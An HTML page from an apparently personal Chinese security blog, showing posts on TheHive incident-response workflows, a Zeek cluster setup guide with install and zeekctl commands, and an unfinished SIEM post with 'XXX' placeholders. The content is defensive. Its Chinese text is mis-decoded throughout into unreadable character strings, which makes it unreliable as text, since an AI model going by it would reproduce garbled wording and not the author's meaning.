class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å¯ç”¨æ’ä»¶"><a href="#å¯ç”¨æ’ä»¶" class="headerlink" title="å¯ç”¨æ’ä»¶"></a>å¯ç”¨æ’ä»¶</h3><ul>
<li><p><em>Analyzers</em></p>
<ul>
<li><em>ThreatBook - Analyzers Config</em></li>
</ul>
<p>![Analyzers Config](/Analyzers Config.png)</p>
<ul>
<li><em>ThreatBook - Analyzers</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/Analyzers.png" alt="Analyzers"></p>
</li>
<li><p><em>Responders</em></p>
<ul>
<li><em>Mail - Responders Config</em></li>
</ul>
<p>![Responders Config](/Responders Config.png)</p>
<ul>
<li><em>Mail - Responders</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/Responders.png" alt="Responders"></p>
</li>
</ul>
<h1 id="ä½¿ç”¨åœºæ™¯"><a href="#ä½¿ç”¨åœºæ™¯" class="headerlink" title="ä½¿ç”¨åœºæ™¯"></a>ä½¿ç”¨åœºæ™¯</h1><p>â€‹    ä¸‹é¢æ¥è¯´ä¸€ä¸‹æˆ‘ä»¬éƒ½ç”¨<em>TheHive</em>åšäº†å“ªäº›ï¼Œåˆšå¼€å§‹ä½¿ç”¨åœºæ™¯å…¶å®å¹¶ä¸å¤šï¼Œè¿˜éœ€è¦åæœŸçš„æ‘¸ç´¢ã€‚</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/workflow.png" alt="workflow"></p>
<p>æå‰åˆ›å»ºå¥½æ¨¡æ¿ï¼Œä¾‹å¦‚ï¼šæŒ‰ç…§Playbookçš„å½¢å¼æå‰åˆ›å»ºå¥½ã€‚ä¾¿äºåæœŸå¿«é€Ÿå¼•ç”¨</p>
<ul>
<li><p>åˆ†æå‘¨æŠ¥æ¨¡æ¿</p>
<p>æŒ‰ç…§å‘¨ä¸ºå•ä½åˆ›å»ºCaseï¼Œä»¥å¤©ä¸ºå•ä½åˆ›å»ºTaskã€‚</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%91%A8%E6%8A%A5%E6%A8%A1%E6%9D%BF.png" alt="å‘¨æŠ¥æ¨¡æ¿"></p>
</li>
<li><p>åº”æ€¥å“åº”æ¨¡æ¿</p>
<p>å¯ä»¥å‚ç…§åº”æ€¥å“åº”é˜¶æ®µæ¥åˆ›å»º</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A8%A1%E6%9D%BF.png" alt="åº”æ€¥å“åº”"></p>
</li>
<li><p>å¼•ç”¨æ¨¡æ¿</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%BC%95%E7%94%A8%E6%A8%A1%E6%9D%BF.png" alt="å¼•ç”¨æ¨¡æ¿"></p>
</li>
<li><p>äº‹ä»¶è¿è¥ï¼š<em>SIEM</em>ï¼ˆ<em>Alarm</em>ï¼‰ -&gt; <em>TheHive</em>ï¼ˆ<em>Alert</em>ï¼‰</p>
<p><em>TheHive</em>ä¸<em>SIEM</em>åšäº†å¯¹æ¥ï¼Œä¸»è¦å°†ä¸¤ç§ç±»å‹çš„å‘Šè­¦è‡ªåŠ¨åŒ–çš„æ¨é€åˆ°äº†<em>TheHive</em>ä¸Šã€‚</p>
<ul>
<li><p>ç¬¬ä¸€ç§ï¼šéœ€è¦ç ”åˆ¤çš„å®‰å…¨äº‹ä»¶ã€‚ä¾‹å¦‚ï¼šåŸºäºå†…-&gt;å¤–çš„<em>NetFlow</em>å‘Šè­¦äº‹ä»¶ï¼ˆå¼‚å¸¸ç«¯å£è®¿é—®ï¼Œå‘¨æœŸæ€§è¯·æ±‚ç­‰ç­‰ï¼‰ã€æ•æ„Ÿä¿¡æ¯æ³„æ¼å‘Šè­¦äº‹ä»¶ï¼ˆé»‘å®¢è®ºå›ç›‘æ§ã€<em>GitHub</em>ç›‘æ§ï¼‰ã€‚é€šå¸¸è¿™ç±»äº‹ä»¶éœ€è¦è¿›è¡ŒäºŒæ¬¡ç¡®è®¤çš„ï¼Œæ‰€ä»¥ä¼šé€‰æ‹©é€šè¿‡<em>TheHive</em>æ¥è®°å½•æ•´ä¸ªäº‹ä»¶çš„å¤„ç†è¿‡ç¨‹ã€‚</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E4%BA%BA%E5%B7%A5%E7%A0%94%E5%88%A4%E4%BA%8B%E4%BB%B6-1.png" alt="äººå·¥ç ”åˆ¤äº‹ä»¶-1"></p>
</li>
<li><p>ç¬¬äºŒç§ï¼šéœ€è¦é‡ç‚¹å…³æ³¨çš„å®‰å…¨äº‹ä»¶ã€‚ä¾‹å¦‚ï¼š<em>EDR</em>ä¸Šçš„å‘Šè­¦äº‹ä»¶ï¼Œå‘½ä¸­C2æŒ‡æ ‡çš„æƒ…æŠ¥å‘Šè­¦ï¼Œé€šå¸¸è¿™ç±»äº‹ä»¶éœ€è¦ç¬¬ä¸€æ—¶é—´å»å“åº”ã€‚</p>
<ul>
<li>åœ¨äº‹ä»¶å“åº”çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥å€ŸåŠ©<em>Cortex Analyzers</em>çš„èƒ½åŠ›ååŠ©æˆ‘ä»¬è¿›è¡Œæ•°æ®åˆ†æã€‚å¦‚ï¼šåŒæ—¶è°ƒç”¨å¤šå®¶æƒ…æŠ¥å‚å•†æ¥å£è¿›è¡ŒæŸ¥è¯¢ï¼Œä¸°å¯ŒåŒ–æ•°æ®ä¿¡æ¯ï¼ˆæŸ¥è¯¢<em>PDNS</em>ä¿¡æ¯ã€<em>Whois</em>ä¿¡æ¯ã€CMDBç­‰ï¼‰ï¼Œè”åŠ¨<em>SIEM</em>æŸ¥è¯¢è¿‘ä¸€æ®µæ—¶é—´å†…çš„å®‰å…¨äº‹ä»¶ç­‰ã€‚</li>
<li>å¯¹äºå·²â€œå®é”¤â€çš„<em>æŒ‡æ ‡</em>ï¼Œå¯é€šè¿‡<em>Cortex Responders</em>ç»„ä»¶ä¸å®‰å…¨è®¾å¤‡è¿›è¡Œè”åŠ¨ï¼Œæ‰¹é‡ä¸‹å‘é˜»æ–­ç­–ç•¥ï¼ŒåŠæ—¶æ­¢æŸã€‚</li>
<li>å¯¹äºè·¨éƒ¨é—¨åä½œçš„é—®é¢˜ï¼Œå¯åˆ©ç”¨<em>TheHive</em>å»åŒæ­¥äº‹ä»¶å“åº”çš„è¿›åº¦ï¼ŒåŒ…æ‹¬åœ¨åŒä¸€ä¸ªCaseé‡Œè®¨è®ºè¯¥é—®é¢˜ã€‚</li>
<li>é€šè¿‡å¯¹å“åº”è¿‡ç¨‹çš„è®°å½•ï¼Œå¯æ›´å¥½çš„å¸®åŠ©æˆ‘ä»¬å»ä¼˜åŒ–å®‰å…¨äº‹ä»¶å“åº”æµç¨‹ï¼Œå¹¶åŒæ—¶å¸®åŠ©æˆ‘ä»¬ç§¯ç´¯<em>Playbook</em>ï¼Œä¸ºæ—¥åçš„è‡ªåŠ¨åŒ–åšé“ºå«ã€‚</li>
</ul>
</li>
</ul>
</li>
<li><p>è§„åˆ™è¿è¥ï¼š<em>SIEM</em>ï¼ˆ<em>Alarm</em>ã€<em>Alert</em>ï¼‰-&gt; <em>TheHive</em>ï¼ˆ<em>Case</em>ï¼‰</p>
<p>â€‹        ä¸»è¦æ˜¯å°†åˆ†ææ—¶å‘ç°çš„è§„åˆ™è¯¯æŠ¥ä»¥åŠæ¼æŠ¥çš„æƒ…å†µï¼Œé€šè¿‡æ‰‹åŠ¨æäº¤<em>Case</em>çš„å½¢å¼å‘é€åˆ°<em>TheHive</em>ä¸Šã€‚ä¾‹å¦‚ï¼Œåœ¨<em>SIEM</em>ä¸Šå‘ç°äº†æŸä¸ªå‘Šè­¦å­˜åœ¨è¯¯æŠ¥çš„ç°è±¡ï¼Œé€šè¿‡<em>SIEM</em>æäº¤è¯¥å‘Šè­¦ä¿¡æ¯ç»™æŒ‡å®šè´Ÿè´£äººï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å°†é‚®ä»¶ä»¥åŠ<em>Case</em>è½¬åˆ°è¯¥äººå‘˜åä¸‹ã€‚</p>
<ul>
<li>é€šè¿‡<em>SIEM</em>æ¨é€è‡³<em>TheHive</em>ï¼Œå¹¶é€šçŸ¥åˆ†æäººå‘˜è¿›è¡Œè§„åˆ™ä¼˜åŒ–ã€‚</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-4.png" alt="è§„åˆ™è¿è¥-4"></p>
<ul>
<li>æäº¤Caseå¹¶é‚®ä»¶é€šçŸ¥</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-5.png" alt="è§„åˆ™è¿è¥-5"></p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-6.png" alt="è§„åˆ™è¿è¥-6"></p>
<ul>
<li>TheHive</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-7.png" alt="è§„åˆ™è¿è¥-7"></p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-8.png" alt="è§„åˆ™è¿è¥-8"></p>
</li>
<li><p>æ—¥å¸¸äº‹é¡¹ï¼š</p>
<ul>
<li><p>å®‰å…¨åˆ†æå‘¨æŠ¥</p>
<ul>
<li>ä»¥å‘¨ä¸ºå•ä½åˆ›å»º<em>Case</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A501.png" alt="å®‰å…¨åˆ†æå‘¨æŠ¥01"></p>
<ul>
<li>ä»¥å¤©ä¸ºå•ä½åˆ›å»º<em>Task</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A503.png" alt="å®‰å…¨åˆ†æå‘¨æŠ¥03"></p>
<ul>
<li>å‘Šè­¦ä¸<em>Case</em>ç›¸å…³è”</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A505.png" alt="å®‰å…¨åˆ†æå‘¨æŠ¥05"></p>
<ul>
<li>æ‰¹é‡åˆ†æ<em>IoC</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A502.png" alt="å®‰å…¨åˆ†æå‘¨æŠ¥02"></p>
<ul>
<li>åˆ†äº«ç»™éœ€è¦å…³æ³¨çš„å°ç»„</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A504.png" alt="å®‰å…¨åˆ†æå‘¨æŠ¥04"></p>
</li>
</ul>
</li>
</ul>
<hr>
<p><strong>å†™åœ¨æœ€åï¼š</strong>        </p>
<p>â€‹    å¦‚æœä½ æœ‰å…³æ³¨è¿‡å¼€æºè§£å†³æ–¹æ¡ˆçš„è¯ï¼Œç›¸ä¿¡ä½ ä¸€å®šæœ‰çœ‹åˆ°è¿‡ä¸€äº›<em>TheHive</em>ä¸å·¥ä½œæµï¼ˆ**<a target="_blank" rel="noopener" href="https://medium.com/shuffle-automation">Shuffle</a>ã€<a target="_blank" rel="noopener" href="https://docs.n8n.io/nodes/n8n-nodes-base.theHive/#basic-operations">n8n</a><strong>ï¼‰ç»„ä»¶æ•´åˆçš„æ–¹æ¡ˆã€‚ä¸éš¾çœ‹å‡ºï¼Œ<em>TheHive</em>æ“…é•¿çš„æ˜¯äº‹ä»¶å“åº”ä¸åˆ†æï¼Œè¿™æ˜¯ä¸€ç§åŠè‡ªåŠ¨åŒ–çš„å½¢å¼ã€‚é€šè¿‡ä¸å·¥ä½œæµç»„ä»¶çš„å¯¹æ¥ï¼Œä½ ä¼šå‘ç°è¿™å°±æ˜¯ä¸€ä¸ªâ€œ</strong>æ•£è£…*<em>â€ç‰ˆçš„</em>SOAR<em>ã€‚å•†ä¸šçš„</em>SOAR<em>ç›¸æ¯”å¼€æºçš„</em>SOAR<em>å¤šäº†ä¸€ä¸ªâ€œä½œæˆ˜å®¤â€çš„æ¦‚å¿µï¼Œè¿™ä¸ªåŠŸèƒ½ä¸</em>TheHive<em>å°±ä¼šæœ‰é‚£ä¹ˆä¸€äº›ç›¸ä¼¼ã€‚ä¾‹å¦‚ï¼šä½ å¯ä»¥åœ¨ä½œæˆ˜å®¤ä¸­åˆ†ææŸä¸ªIPçš„æƒ…æŠ¥ä¿¡æ¯ï¼Œæˆ–è€…è”åŠ¨ç°æœ‰å®‰å…¨è®¾å¤‡å¯¹æŸä¸ª</em>IoC<em>è¿›è¡Œå“åº”çš„æ“ä½œã€‚è¿™äº›åŠŸèƒ½å…¶å®å°±æ˜¯å¯¹åº”åˆ°äº†</em>TheHive<em>ä¸­çš„</em>Analyzers<em>ä¸</em>Responders*çš„åŠŸèƒ½ã€‚</p>
<p>â€‹    æˆ‘ä¸ªäººè§‰å¾—<em>TheHive</em>è¿™ç§â€œåŠè‡ªåŠ¨åŒ–â€çš„å½¢å¼ï¼Œå¯ä»¥å¾ˆå¥½çš„ä¸<em>SOAR</em>è¿›è¡Œäº’è¡¥ï¼Œç›¸ä¿¡ä¸<em>SOAR</em>å¯¹æ¥åä¼šæœ‰æ›´å¤šçš„â€œä»·å€¼â€è¢«ä½“ç°å‡ºæ¥ã€‚ä¾‹å¦‚ï¼šåœ¨åˆ†æä»»åŠ¡ä¸­å¯æŒ‰ç…§åœºæ™¯çš„ä¸åŒæœ‰é€‰æ‹©çš„è°ƒç”¨<em>SOAR</em>çš„<em>PalyBook</em>ï¼Œå¹¶å°†å“åº”ç»“æœ<em>feedback</em>è‡³<em>TheHive</em>ä¸­ã€‚å…¶å®<em>TheHive</em>ä¸Šè¿˜æœ‰æŒºå¤šä¸œè¥¿å€¼å¾—è¯´çš„ï¼Œä¸€æ¬¡ä¹Ÿå†™ä¸å®Œã€‚æ›´å¤šä¸œè¥¿è¿˜éœ€è¦æˆ‘ä»¬æ ¹æ®å®é™…åœºæ™¯å†å»æŒ–æ˜ï¼Œâ€œæ€è·¯â€å¾ˆé‡è¦ï¼</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/02/Zeek-%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E6%A8%A1%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="ä¸€ä¸ªçƒ­çˆ±å¥èº«çš„å®‰å…¨åˆ†æå¸ˆ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/03/02/Zeek-%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E6%A8%A1%E5%BC%8F/" class="post-title-link" itemprop="url">Zeek - é›†ç¾¤éƒ¨ç½²æ¨¡å¼</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-02 10:40:04" itemprop="dateCreated datePublished" datetime="2021-03-02T10:40:04+08:00">2021-03-02</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">æ›´æ–°äº</span>
        <time title="ä¿®æ”¹æ—¶é—´ï¼š2021-03-05 14:38:44" itemprop="dateModified" datetime="2021-03-05T14:38:44+08:00">2021-03-05</time>
      </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>1.3k</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>1 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><p><strong><a target="_blank" rel="noopener" href="https://software.opensuse.org/download.html?project=security:zeek&package=zeek">åœ¨çº¿å®‰è£…</a></strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;deb http://download.opensuse.org/repositories/security:/zeek/Debian_10/ /&#x27;</span> | sudo tee /etc/apt/sources.list.d/security:zeek.list</span><br><span class="line">$ curl -fsSL https://download.opensuse.org/repositories/security:zeek/Debian_10/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/security_zeek.gpg &gt; /dev/null</span><br><span class="line">$ sudo apt update</span><br><span class="line">$ sudo apt install zeek</span><br></pre></td></tr></table></figure>





<h4 id="æ¶æ„å›¾"><a href="#æ¶æ„å›¾" class="headerlink" title="æ¶æ„å›¾"></a>æ¶æ„å›¾</h4><p><img src="https://docs.zeek.org/en/master/_images/deployment.png" alt="_images / deployment.png"></p>
<p><strong>Manager -&gt; Worker</strong></p>
<ol>
<li>åœ¨è®¾ç½®é›†ç¾¤æ—¶ï¼Œå¿…é¡»åœ¨æ‰€æœ‰ä¸»æœºä¸Šè®¾ç½®Zeekç”¨æˆ·ï¼Œå¹¶ä¸”è¯¥ç”¨æˆ·å¿…é¡»èƒ½å¤Ÿä»ç®¡ç†å™¨ä¸­å¯¹é›†ç¾¤ä¸­çš„æ‰€æœ‰æœºå™¨è¿›è¡Œsshè®¿é—®ï¼Œå¹¶ä¸”å¿…é¡»åœ¨ä¸è¢«æç¤ºå¯†ç /å£ä»¤çš„æƒ…å†µä¸‹å·¥ä½œï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨sshå…¬é’¥è®¤è¯ï¼‰ã€‚å¦å¤–ï¼Œåœ¨å·¥ä½œèŠ‚ç‚¹ä¸Šï¼Œè¯¥ç”¨æˆ·å¿…é¡»èƒ½å¤Ÿä»¥æ··æ‚æ¨¡å¼è®¿é—®ç›®æ ‡ç½‘ç»œæ¥å£ã€‚</li>
<li>å­˜å‚¨å¿…é¡»åœ¨åŒä¸€è·¯å¾„ä¸‹çš„æ‰€æœ‰ä¸»æœºä¸Šå¯ç”¨ã€‚</li>
</ol>
<h5 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…Zeek ç•¥è¿‡</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”ŸæˆSSH Key</span></span><br><span class="line">$ ssh-keygen</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®°å¾—WorkerèŠ‚ç‚¹éœ€è¦åˆ›å»º.sshç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤åˆ¶ssh pubåˆ°Zeek Worker</span></span><br><span class="line">$ scp /root/.ssh/id_rsa.pub root@Zeek-Worker1:~/.ssh/authorized_keys2</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®Manager node.cfg</span></span><br><span class="line">$ vim /opt/zeek/etc/node.cfg</span><br><span class="line">[logger-1]</span><br><span class="line"><span class="built_in">type</span>=logger</span><br><span class="line">host=Zeek-Manager</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[manager]</span><br><span class="line"><span class="built_in">type</span>=manager</span><br><span class="line">host=Zeek-Manager</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[proxy-1]</span><br><span class="line"><span class="built_in">type</span>=proxy</span><br><span class="line">host=Zeek-Manager</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[worker-1]</span><br><span class="line"><span class="built_in">type</span>=worker</span><br><span class="line">host=Zeek-Worker1</span><br><span class="line">interface=ens224</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[worker-2]</span><br><span class="line"><span class="built_in">type</span>=worker</span><br><span class="line">host=Zeek-Worker2</span><br><span class="line">interface=ens224</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ£€æŸ¥Zeek</span></span><br><span class="line">$ zeekctl</span><br><span class="line">[ZeekControl] &gt; check</span><br><span class="line">logger-1 scripts are ok.</span><br><span class="line">manager scripts are ok.</span><br><span class="line">proxy-1 scripts are ok.</span><br><span class="line">worker-1 scripts are ok.</span><br><span class="line">worker-2 scripts are ok.</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨Zeek</span></span><br><span class="line">$ zeekctl</span><br><span class="line">[ZeekControl] &gt; start</span><br><span class="line">starting logger ...</span><br><span class="line">starting manager ...</span><br><span class="line">starting proxy ...</span><br><span class="line">starting workers ...</span><br></pre></td></tr></table></figure>



<h4 id="é›†ç¾¤ä¸­æ€§èƒ½æ˜¯å¦å¯¹äºå•å°æœ‰ä¼˜åŒ–å¾…æµ‹è¯•"><a href="#é›†ç¾¤ä¸­æ€§èƒ½æ˜¯å¦å¯¹äºå•å°æœ‰ä¼˜åŒ–å¾…æµ‹è¯•" class="headerlink" title="é›†ç¾¤ä¸­æ€§èƒ½æ˜¯å¦å¯¹äºå•å°æœ‰ä¼˜åŒ–å¾…æµ‹è¯•"></a>é›†ç¾¤ä¸­æ€§èƒ½æ˜¯å¦å¯¹äºå•å°æœ‰ä¼˜åŒ–å¾…æµ‹è¯•</h4>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/02/SIEM%EF%BC%88%E4%BA%8C%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="ä¸€ä¸ªçƒ­çˆ±å¥èº«çš„å®‰å…¨åˆ†æå¸ˆ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/02/02/SIEM%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">è‡´æˆ‘å¿ƒä¸­çš„ â€œæ•£è£…â€ï¼ˆå¼€æºï¼‰SIEMï¼ˆäºŒï¼‰</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2021-02-02 16:55:52" itemprop="dateCreated datePublished" datetime="2021-02-02T16:55:52+08:00">2021-02-02</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">æ›´æ–°äº</span>
        <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-03-30 17:50:56" itemprop="dateModified" datetime="2022-03-30T17:50:56+08:00">2022-03-30</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/SIEM/" itemprop="url" rel="index"><span itemprop="name">SIEM</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>5.6k</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>5 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h1><p>XXX</p>
<hr>
<h1 id="SIEM-v0-2-çš„ä¸è¶³"><a href="#SIEM-v0-2-çš„ä¸è¶³" class="headerlink" title="SIEM v0.2 çš„ä¸è¶³"></a>SIEM v0.2 çš„ä¸è¶³</h1><p>XXX</p>
<hr>
